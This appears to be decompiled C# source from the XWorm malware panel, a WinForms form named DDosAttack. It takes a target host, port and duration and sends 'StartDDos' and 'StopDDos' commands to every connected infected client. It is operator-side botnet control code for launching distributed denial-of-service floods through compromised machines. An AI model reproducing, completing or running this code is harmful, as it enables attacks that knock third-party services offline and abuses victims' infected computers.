#define DEBUG
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;


namespace XWorm;

[DesignerGenerated]
public class DDosAttack : Form
{
	[CompilerGenerated]
	internal sealed class _Closure_0024__R77_002D0
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R77_002D0(_Closure_0024__R77_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R2(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R80_002D2
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R80_002D2(_Closure_0024__R80_002D2 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R4(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R81_002D4
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R81_002D4(_Closure_0024__R81_002D4 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R6(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private System.Windows.Forms.Timer _Timer1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer2")]
	private System.Windows.Forms.Timer _Timer2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton3")]
	private Guna2GradientButton _Guna2GradientButton3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton2")]
	private Guna2GradientButton _Guna2GradientButton2;

	private TimeSpan timeSpan_0;

	private Stopwatch stopwatch_0;

	public static List<GClass5> gclass5s_0 = new List<GClass5>();

	[field: AccessedThroughProperty("label4")]
	public Label label4
	;

	[field: AccessedThroughProperty("StatusStrip1")]
	public StatusStrip StatusStrip1
	;

	[field: AccessedThroughProperty("ToolStripStatusLabel1")]
	public ToolStripStatusLabel ToolStripStatusLabel1
	;

	public System.Windows.Forms.Timer Timer1
	;

	[field: AccessedThroughProperty("ToolStripStatusLabel2")]
	public ToolStripStatusLabel ToolStripStatusLabel2
	;

	public System.Windows.Forms.Timer Timer2
	;

	[field: AccessedThroughProperty("Guna2GroupBox1")]
	public Guna2GroupBox Guna2GroupBox1
	;

	[field: AccessedThroughProperty("Label5")]
	public Label Label5
	;

	[field: AccessedThroughProperty("Label6")]
	public Label Label6
	;

	[field: AccessedThroughProperty("txtPort")]
	public Guna2TextBox txtPort
	;

	[field: AccessedThroughProperty("txtHost")]
	public Guna2TextBox txtHost
	;
	[field: AccessedThroughProperty("Guna2GroupBox2")]
	public Guna2GroupBox Guna2GroupBox2
	;

	[field: AccessedThroughProperty("Label7")]
	public Label Label7
	;

	[field: AccessedThroughProperty("txtTimeout")]
	public Guna2TextBox txtTimeout
	;

	[field: AccessedThroughProperty("Guna2GroupBox3")]
	public Guna2GroupBox Guna2GroupBox3
	;

	public Guna2GradientButton Guna2GradientButton3
	;

	public Guna2GradientButton Guna2GradientButton2
	;
	public DDosAttack()
	{
		base.FormClosing += DDosAttack_FormClosing;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(XWorm.DDosAttack));
		this.label4 = new System.Windows.Forms.Label();
		this.StatusStrip1 = new System.Windows.Forms.StatusStrip();
		this.ToolStripStatusLabel2 = new System.Windows.Forms.ToolStripStatusLabel();
		this.ToolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
		this.Timer1 = new System.Windows.Forms.Timer(this.components);
		this.Timer2 = new System.Windows.Forms.Timer(this.components);
		this.Guna2GroupBox1 = new Guna.UI2.WinForms.Guna2GroupBox();
		this.txtPort = new Guna.UI2.WinForms.Guna2TextBox();
		this.txtHost = new Guna.UI2.WinForms.Guna2TextBox();
		this.Label5 = new System.Windows.Forms.Label();
		this.Label6 = new System.Windows.Forms.Label();
		this.Guna2GroupBox2 = new Guna.UI2.WinForms.Guna2GroupBox();
		this.txtTimeout = new Guna.UI2.WinForms.Guna2TextBox();
		this.Label7 = new System.Windows.Forms.Label();
		this.Guna2GroupBox3 = new Guna.UI2.WinForms.Guna2GroupBox();
		this.Guna2GradientButton3 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Guna2GradientButton2 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.StatusStrip1.SuspendLayout();
		this.Guna2GroupBox1.SuspendLayout();
		this.Guna2GroupBox2.SuspendLayout();
		this.Guna2GroupBox3.SuspendLayout();
		base.SuspendLayout();
		this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
		this.Timer2.Tick += new System.EventHandler(Timer2_Tick);
		this.Guna2GradientButton3.Click += new System.EventHandler(Guna2GradientButton3_Click);
		this.Guna2GradientButton2.Click += new System.EventHandler(Guna2GradientButton2_Click);
		this.label4.AutoSize = true;
		this.label4.Location = new System.Drawing.Point(203, 38);
		this.label4.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label4.Name = "label4";
		this.label4.Size = new System.Drawing.Size(28, 15);
		this.label4.TabIndex = 5;
		this.label4.Text = "Min";
		this.StatusStrip1.BackColor = System.Drawing.Color.White;
		this.StatusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.ToolStripStatusLabel2, this.ToolStripStatusLabel1 });
		this.StatusStrip1.Location = new System.Drawing.Point(0, 276);
		this.StatusStrip1.Name = "StatusStrip1";
		this.StatusStrip1.Size = new System.Drawing.Size(317, 22);
		this.StatusStrip1.TabIndex = 58;
		this.StatusStrip1.Text = "StatusStrip1";
		this.ToolStripStatusLabel2.ForeColor = System.Drawing.Color.Black;
		this.ToolStripStatusLabel2.Name = "ToolStripStatusLabel2";
		this.ToolStripStatusLabel2.Size = new System.Drawing.Size(13, 17);
		this.ToolStripStatusLabel2.Text = "..";
		this.ToolStripStatusLabel1.ForeColor = System.Drawing.Color.Black;
		this.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1";
		this.ToolStripStatusLabel1.Size = new System.Drawing.Size(13, 17);
		this.ToolStripStatusLabel1.Text = "..";
		this.Timer1.Interval = 1000;
		this.Timer2.Enabled = true;
		this.Timer2.Interval = 3000;
		this.Guna2GroupBox1.BorderRadius = 3;
		this.Guna2GroupBox1.Controls.Add(this.txtPort);
		this.Guna2GroupBox1.Controls.Add(this.txtHost);
		this.Guna2GroupBox1.Controls.Add(this.Label5);
		this.Guna2GroupBox1.Controls.Add(this.Label6);
		this.Guna2GroupBox1.CustomBorderThickness = new System.Windows.Forms.Padding(0);
		this.Guna2GroupBox1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GroupBox1.ForeColor = System.Drawing.Color.Black;
		this.Guna2GroupBox1.Location = new System.Drawing.Point(12, 12);
		this.Guna2GroupBox1.Name = "Guna2GroupBox1";
		this.Guna2GroupBox1.Size = new System.Drawing.Size(291, 97);
		this.Guna2GroupBox1.TabIndex = 3;
		this.Guna2GroupBox1.Text = "Target";
		this.txtPort.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.txtPort.BorderRadius = 3;
		this.txtPort.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.txtPort.DefaultText = "80";
		this.txtPort.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.txtPort.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.txtPort.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.txtPort.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.txtPort.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.txtPort.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.txtPort.ForeColor = System.Drawing.Color.Black;
		this.txtPort.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.txtPort.Location = new System.Drawing.Point(57, 64);
		this.txtPort.Name = "txtPort";
		this.txtPort.PasswordChar = '\0';
		this.txtPort.PlaceholderForeColor = System.Drawing.Color.Black;
		this.txtPort.PlaceholderText = "";
		this.txtPort.SelectedText = "";
		this.txtPort.Size = new System.Drawing.Size(216, 21);
		this.txtPort.TabIndex = 60;
		this.txtHost.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.txtHost.BorderRadius = 3;
		this.txtHost.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.txtHost.DefaultText = "www.google.com";
		this.txtHost.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.txtHost.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.txtHost.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.txtHost.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.txtHost.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.txtHost.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.txtHost.ForeColor = System.Drawing.Color.Black;
		this.txtHost.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.txtHost.Location = new System.Drawing.Point(57, 37);
		this.txtHost.Name = "txtHost";
		this.txtHost.PasswordChar = '\0';
		this.txtHost.PlaceholderForeColor = System.Drawing.Color.Black;
		this.txtHost.PlaceholderText = "";
		this.txtHost.SelectedText = "";
		this.txtHost.Size = new System.Drawing.Size(216, 21);
		this.txtHost.TabIndex = 59;
		this.Label5.AutoSize = true;
		this.Label5.Location = new System.Drawing.Point(16, 66);
		this.Label5.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.Label5.Name = "Label5";
		this.Label5.Size = new System.Drawing.Size(35, 15);
		this.Label5.TabIndex = 3;
		this.Label5.Text = "Port :";
		this.Label6.AutoSize = true;
		this.Label6.Location = new System.Drawing.Point(14, 38);
		this.Label6.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.Label6.Name = "Label6";
		this.Label6.Size = new System.Drawing.Size(38, 15);
		this.Label6.TabIndex = 4;
		this.Label6.Text = "Host :";
		this.Guna2GroupBox2.BorderRadius = 3;
		this.Guna2GroupBox2.Controls.Add(this.label4);
		this.Guna2GroupBox2.Controls.Add(this.txtTimeout);
		this.Guna2GroupBox2.Controls.Add(this.Label7);
		this.Guna2GroupBox2.CustomBorderThickness = new System.Windows.Forms.Padding(0);
		this.Guna2GroupBox2.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GroupBox2.ForeColor = System.Drawing.Color.Black;
		this.Guna2GroupBox2.Location = new System.Drawing.Point(12, 115);
		this.Guna2GroupBox2.Name = "Guna2GroupBox2";
		this.Guna2GroupBox2.Size = new System.Drawing.Size(291, 70);
		this.Guna2GroupBox2.TabIndex = 59;
		this.Guna2GroupBox2.Text = "Settings";
		this.txtTimeout.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.txtTimeout.BorderRadius = 3;
		this.txtTimeout.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.txtTimeout.DefaultText = "5";
		this.txtTimeout.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.txtTimeout.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.txtTimeout.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.txtTimeout.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.txtTimeout.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.txtTimeout.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.txtTimeout.ForeColor = System.Drawing.Color.Black;
		this.txtTimeout.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.txtTimeout.Location = new System.Drawing.Point(77, 35);
		this.txtTimeout.Name = "txtTimeout";
		this.txtTimeout.PasswordChar = '\0';
		this.txtTimeout.PlaceholderForeColor = System.Drawing.Color.Black;
		this.txtTimeout.PlaceholderText = "";
		this.txtTimeout.SelectedText = "";
		this.txtTimeout.Size = new System.Drawing.Size(121, 21);
		this.txtTimeout.TabIndex = 61;
		this.Label7.AutoSize = true;
		this.Label7.Location = new System.Drawing.Point(14, 36);
		this.Label7.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.Label7.Name = "Label7";
		this.Label7.Size = new System.Drawing.Size(57, 15);
		this.Label7.TabIndex = 5;
		this.Label7.Text = "Timeout :";
		this.Guna2GroupBox3.BorderRadius = 3;
		this.Guna2GroupBox3.Controls.Add(this.Guna2GradientButton3);
		this.Guna2GroupBox3.Controls.Add(this.Guna2GradientButton2);
		this.Guna2GroupBox3.CustomBorderThickness = new System.Windows.Forms.Padding(0);
		this.Guna2GroupBox3.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GroupBox3.ForeColor = System.Drawing.Color.Black;
		this.Guna2GroupBox3.Location = new System.Drawing.Point(12, 191);
		this.Guna2GroupBox3.Name = "Guna2GroupBox3";
		this.Guna2GroupBox3.Size = new System.Drawing.Size(291, 74);
		this.Guna2GroupBox3.TabIndex = 60;
		this.Guna2GroupBox3.Text = "Command";
		this.Guna2GradientButton3.BorderRadius = 4;
		this.Guna2GradientButton3.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton3.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton3.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton3.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton3.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton3.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton3.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton3.Image = XWorm_Resources._Stop;
		this.Guna2GradientButton3.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton3.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton3.Location = new System.Drawing.Point(170, 38);
		this.Guna2GradientButton3.Name = "Guna2GradientButton3";
		this.Guna2GradientButton3.Size = new System.Drawing.Size(103, 24);
		this.Guna2GradientButton3.TabIndex = 98;
		this.Guna2GradientButton3.Text = "Stop";
		this.Guna2GradientButton2.BorderRadius = 4;
		this.Guna2GradientButton2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton2.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton2.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton2.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton2.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton2.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton2.Image = XWorm_Resources.Play;
		this.Guna2GradientButton2.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton2.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton2.Location = new System.Drawing.Point(17, 38);
		this.Guna2GradientButton2.Name = "Guna2GradientButton2";
		this.Guna2GradientButton2.Size = new System.Drawing.Size(103, 24);
		this.Guna2GradientButton2.TabIndex = 97;
		this.Guna2GradientButton2.Text = "Start";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(317, 298);
		base.Controls.Add(this.Guna2GroupBox3);
		base.Controls.Add(this.Guna2GroupBox2);
		base.Controls.Add(this.Guna2GroupBox1);
		base.Controls.Add(this.StatusStrip1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "DDosAttack";
		this.Text = "DDosAttack";
		this.StatusStrip1.ResumeLayout(false);
		this.StatusStrip1.PerformLayout();
		this.Guna2GroupBox1.ResumeLayout(false);
		this.Guna2GroupBox1.PerformLayout();
		this.Guna2GroupBox2.ResumeLayout(false);
		this.Guna2GroupBox2.PerformLayout();
		this.Guna2GroupBox3.ResumeLayout(false);
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	public static string smethod_0(string Address)
	{
		string result;
		try
		{
			result = new Uri(Address).DnsSafeHost;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			result = Address;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private void DDosAttack_FormClosing(object sender, FormClosingEventArgs e)
	{
		byte[] array = Module0.smethod_6("StopDDos");
		_Closure_0024__R77_002D0 closure_0024__R77_002D = default(_Closure_0024__R77_002D0);
		foreach (GClass5 item in gclass5s_0)
		{
			closure_0024__R77_002D = new _Closure_0024__R77_002D0(closure_0024__R77_002D);
			closure_0024__R77_002D._0024VB_0024NonLocal_2 = item;
			ThreadPool.QueueUserWorkItem(closure_0024__R77_002D._Lambda_0024__R2, array);
		}
		gclass5s_0.Clear();
		Hide();
		base.Parent = null;
		e.Cancel = true;
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		ToolStripStatusLabel1.Text = $"Timeout :{timeSpan_0.Subtract(TimeSpan.FromSeconds(stopwatch_0.Elapsed.Seconds))}";
		if (timeSpan_0 < stopwatch_0.Elapsed)
		{
			Guna2GradientButton2.Enabled = true;
			Guna2GradientButton3.Enabled = false;
			Timer1.Stop();
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		try
		{
			foreach (GClass5 item in gclass5s_0.ToList())
			{
				if (!item.bool_0)
				{
					try
					{
						gclass5s_0.Remove(item);
						ToolStripStatusLabel2.Text = "Clients [" + Conversions.ToString(gclass5s_0.Count) + "]";
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2GradientButton2_Click(object sender, EventArgs e)
	{
		if (gclass5s_0.Count <= 0 || string.IsNullOrWhiteSpace(txtHost.Text) || string.IsNullOrWhiteSpace(txtPort.Text) || string.IsNullOrWhiteSpace(txtTimeout.Text))
		{
			return;
		}
		txtHost.Text = smethod_0(txtHost.Text);
		Guna2GradientButton2.Enabled = false;
		byte[] array = Module0.smethod_6("StartDDos" + GClass19.string_0 + txtHost.Text + ":" + txtPort.Text + ":" + txtTimeout.Text);
		_Closure_0024__R80_002D2 closure_0024__R80_002D = default(_Closure_0024__R80_002D2);
		foreach (GClass5 item in gclass5s_0)
		{
			closure_0024__R80_002D = new _Closure_0024__R80_002D2(closure_0024__R80_002D);
			closure_0024__R80_002D._0024VB_0024NonLocal_2 = item;
			ThreadPool.QueueUserWorkItem(closure_0024__R80_002D._Lambda_0024__R4, array);
		}
		Guna2GradientButton3.Enabled = true;
		timeSpan_0 = TimeSpan.FromSeconds(checked(Convert.ToInt32(txtTimeout.Text) * 60));
		stopwatch_0 = new Stopwatch();
		stopwatch_0.Start();
		Timer1.Start();
	}

	private void Guna2GradientButton3_Click(object sender, EventArgs e)
	{
		byte[] array = Module0.smethod_6("StopDDos");
		_Closure_0024__R81_002D4 closure_0024__R81_002D = default(_Closure_0024__R81_002D4);
		foreach (GClass5 item in gclass5s_0)
		{
			closure_0024__R81_002D = new _Closure_0024__R81_002D4(closure_0024__R81_002D);
			closure_0024__R81_002D._0024VB_0024NonLocal_2 = item;
			ThreadPool.QueueUserWorkItem(closure_0024__R81_002D._Lambda_0024__R6, array);
		}
		Guna2GradientButton2.Enabled = true;
		Guna2GradientButton3.Enabled = false;
		Timer1.Stop();
	}
}